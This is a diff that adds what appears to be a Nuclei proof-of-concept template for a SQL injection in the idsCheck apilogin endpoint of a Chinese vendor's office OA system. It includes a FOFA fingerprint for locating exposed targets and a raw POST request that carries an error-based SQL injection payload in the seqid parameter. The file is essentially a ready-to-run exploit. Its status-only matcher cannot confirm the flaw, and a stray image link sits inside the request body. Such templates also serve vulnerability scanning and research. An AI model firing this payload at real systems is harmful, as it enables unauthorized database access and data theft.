@@ -1,0 +1,38 @@
+id: poc-xli9fxsydf2ccmiy
+info:
+  name: 思普信息技术有限公司办公OA系统idsCheck apilogin存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xli9fxsydf2ccmiy'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xli9fxsydf2ccmiy
+    fofa: icon_hash="-403479360"
+http:
+- raw:
+  - 'POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    X-Requested-With: XMLHttpRequest
+
+
+    seqid=1''+AND+6884+IN+(SELECT+(CHAR(113)+CHAR(106)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT+(CASE+WHEN+(6884=6884)+THEN+CHAR(49)+ELSE+CHAR(48)+END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(113)))--+cxaC&datasource=EOMP1
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226576874-7932f7e3-4c1b-4ff6-9b8b-5db1c0c30c29.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
